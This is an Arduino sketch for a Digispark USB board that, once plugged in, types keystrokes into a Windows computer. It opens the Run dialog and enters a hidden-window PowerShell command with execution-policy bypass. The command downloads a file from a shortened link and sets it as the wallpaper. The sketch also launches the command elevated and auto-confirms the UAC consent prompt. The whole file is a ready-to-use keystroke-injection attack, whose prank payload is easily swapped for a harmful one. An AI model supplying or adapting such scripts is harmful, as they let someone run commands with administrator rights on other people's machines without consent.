#include <DigiKeyboard.h>

void setup() {        
  DigiKeyboard.update();
  pinMode(1, OUTPUT);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  
  DigiKeyboard.delay(350);
  DigiKeyboard.print("powershell -Win H -Exec Bypass; Invoke-WebRequest https://bit.ly/3HXY3jG -OutFile $env:TEMP\\sus.jpg; Set-ItemProperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value $env:TEMP\\sus.jpg; rundll32.exe user32.dll, UpdatePerUserSystemParameters;exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  
  DigiKeyboard.delay(350);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
}

void loop() {
  digitalWrite(1, HIGH);
  delay(250);
  digitalWrite(1, LOW);   
  delay(250);
}
